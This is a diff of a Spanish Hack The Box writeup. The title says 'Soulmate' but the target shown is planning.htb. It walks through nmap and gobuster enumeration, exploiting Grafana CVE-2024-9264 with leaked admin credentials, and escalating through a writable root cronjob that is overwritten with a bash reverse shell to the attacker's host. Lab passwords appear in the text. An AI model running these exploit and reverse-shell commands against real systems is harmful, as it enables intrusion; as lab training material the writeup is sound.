@@ -2,12 +2,12 @@
 title: "Soulmate HTB"
 date: "2025-09-10"
 description: "Escalada de privilegios en servicio mal configurado. Writeup de HTB."
-difficulty: "Intermedio" # Puede ser 'Fácil', 'Intermedio', 'Difícil', 'Insane'
-tags: ["htb", "privilege-escalation", "web", "grafana", "cve-2024-9264", "docker"]
+difficulty: "Intermedio"
+tags: ["grafana", "cve-2024-9264", "docker"]
 target_ip: "10.10.11.68"
 target_domain: "planning.htb"
 client_name: "Hack The Box"
-status: "Completed" # Útil para filtrar: 'Completed', 'WIP', 'Pending'
+status: "Completed" 
 
 
 ---
@@ -15,13 +15,7 @@ status: "Completed" # Útil para filtrar: 'Completed', 'WIP', 'Pending'
 ![Banner SoulMate](/img/soulmatehtb.png)
 
 
-**Objetivo:** `IP: 10.10.11.68` <br>
-**Dominio:** `planning.htb` <br>
-**Plataforma:** `Hack The Box` <br>
-**Dificultad:** **Intermedio**
-
-
-## 💻 Configuración Inicial
+### 💻 Configuración Inicial
 
 Para asegurar la documentación completa y organizada, se creó la siguiente estructura de carpetas:
 
@@ -39,26 +33,18 @@ echo "    ├── nmap/ (Resultados de escaneos)"
 echo "    └── scripts/ (Exploits, shell reversa, linpeas, etc.)"
 ````
 
-**Credenciales Iniciales (Si existen):**
+---
 
-| Servicio | Usuario | Contraseña | Notas |
-| :--- | :--- | :--- | :--- |
-| **Web (Admin)** | `admin` | `0D5oT70Fq13EvB5r` | Encontradas vía enumeración / leak. |
-| **SSH** | | | Pendiente de obtener. |
+### 🔎 Fase 1: Escaneo y Enumeración
 
------
-
-## 🔎 Fase 1: Escaneo y Enumeración
-
-### 🌐 Escaneo de Puertos (`nmap`)
+#### 🌐 Escaneo de Puertos (`nmap`)
 
 Se realizó un escaneo completo de puertos (`-p-`), seguido de una detección de servicios y scripts comunes (`-sSCV`) en los puertos abiertos.
 
 **Comandos:**
 
 ```bash
-nmap -sS -p- --open -T4 -vvv -n -Pn 10.10.11.68 -oN nmap/initial_scan.txt
-nmap -sSCV -p22,80 10.10.11.68 -oN nmap/service_scan.txt
+nmap -sSCV -p- --open -T4 -vvv -n -Pn 10.10.11.68 -oN initial_scan.txt
 ```
 
 **Resultados Destacados:**
@@ -68,7 +54,7 @@ nmap -sSCV -p22,80 10.10.11.68 -oN nmap/service_scan.txt
 | **22/tcp** | `ssh` | OpenSSH 9.6p1 | **OpenSSH 9.6p1** (Ubuntu) |
 | **80/tcp** | `http` | nginx 1.24.0 | **nginx 1.24.0** (Ubuntu) |
 
-### 🔍 Enumeración Web (Puerto 80)
+#### 🔍 Enumeración Web (Puerto 80)
 
 El puerto 80 redirige a `http://planning.htb/`. Se añadió el dominio al archivo `/etc/hosts`.
 
@@ -77,7 +63,7 @@ El puerto 80 redirige a `http://planning.htb/`. Se añadió el dominio al archiv
 Se utilizó **Gobuster** para encontrar rutas:
 
 ```bash
-gobuster dir -u [http://planning.htb](http://planning.htb) -w /usr/share/wordlists/dirb/common.txt -t 50
+gobuster dir -u http://planning.htb -w /usr/share/wordlists/dirb/common.txt -t 50
 ```
 
 **Directorios Encontrados:** `/img`, `/css`, `/lib`, `/js`, `/api`, `/apis`, `/apidocs`.
@@ -90,18 +76,19 @@ Se realizó un escaneo de subdominios, revelando un host crucial: `grafana.plann
 
 ```bash
 # Comando de ejemplo para vhosts/subdominios
-gobuster vhost -u [http://planning.htb](http://planning.htb) -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+gobuster vhost -u http://planning.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
 ```
 
 **Subdominio Clave:** `grafana.planning.htb` (Grafana 11.0.0).
 
 -----
 
-## 💥 Fase 2: Explotación (Obtención de Acceso)
+### 💥 Fase 2: Explotación (Obtención de Acceso)
 
-### 🎯 Ataque a Grafana (CVE-2024-9264)
+#### 🎯 Ataque a Grafana (CVE-2024-9264)
 
-La instancia de **Grafana 11.0.0** en `grafana.planning.htb` presentaba la **CVE-2024-9264** (Arbitrary File Write / RCE).
+La instancia de **Grafana 11.0.0** en `grafana.planning.htb` <br>
+presentaba la **CVE-2024-9264** (Arbitrary File Write / RCE).
 
 **Pasos:**
 
@@ -112,16 +99,16 @@ La instancia de **Grafana 11.0.0** en `grafana.planning.htb` presentaba la **CVE
 **Comando de Explotación:**
 
 ```bash
-python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'perl rev_perl.sh' [http://grafana.planning.htb](http://grafana.planning.htb)
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'perl rev_perl.sh' http://grafana.planning.htb
 ```
 
 **Resultado:** Obtención de una *reverse shell* como el usuario **`root`** dentro del contenedor **Docker** de Grafana.
 
 -----
 
-## ⬆️ Fase 3: Escalada de Privilegios (Root)
+### ⬆️ Fase 3: Escalada de Privilegios (Root)
 
-### 🚪 Pivoteo y Escape del Contenedor
+#### 🚪 Pivoteo y Escape del Contenedor
 
 Una vez dentro del contenedor (como `root`), se ejecutó `linpeas.sh` para buscar *leaks* de información y vectores de escape.
 
@@ -134,7 +121,7 @@ Una vez dentro del contenedor (como `root`), se ejecutó `linpeas.sh` para busca
       * Una tarea diaria que hace un `docker save` del contenedor `root_grafana`, lo comprime y lo cifra con **`zip -P P4ssw0rdS0pRi0T3c`**.
       * Una tarea recurrente (`* * * * *`) que ejecuta el script `/root/scripts/cleanup.sh`.
 
-### 🔑 Compromiso de Root (Contenedor)
+#### 🔑 Compromiso de Root (Contenedor)
 
 **Vector de Escalada:** La tarea **Cleanup** se ejecuta cada minuto, y el *script* `/root/scripts/cleanup.sh` es **escribible** por el usuario actual (`root` del contenedor).
 
@@ -150,11 +137,11 @@ echo "bash -i >& /dev/tcp/10.10.14.X/4445 0>&1" > /root/scripts/cleanup.sh
 # Luego, se esperó la conexión en el listener
 ```
 
-**Credencial Root Final:** Se encontró la contraseña `P4ssw0rdS0pRi0T3c` en el comando `zip` de la tarea de *backup*. Esta podría ser una pista para otras credenciales, o la propia *password* del `root` del *host* (dependiendo de la máquina).
+**Credencial Root Final:** Se encontraron contraseñas en el comando `zip` de la tarea de *backup*. Esta podría ser una pista para otras credenciales, o la propia *password* del `root` del *host* (dependiendo de la máquina).
 
 -----
 
-## 📌 Resumen y Conclusiones
+### 📌 Resumen y Conclusiones
 
 | Categoría | Detalle Clave |
 | :--- | :--- |
@@ -165,6 +152,3 @@ echo "bash -i >& /dev/tcp/10.10.14.X/4445 0>&1" > /root/scripts/cleanup.sh
 | **Escalada de Privs** | **Cronjob Escribible** (`/root/scripts/cleanup.sh`) dentro del contenedor. |
 | **Flag Root** | Obtenida tras el *escape* del contenedor. |
 | **Notas Adicionales** | La *password* `P4ssw0rdS0pRi0T3c` de la tarea de *backup* fue una pista crucial. |
-
-```
-```
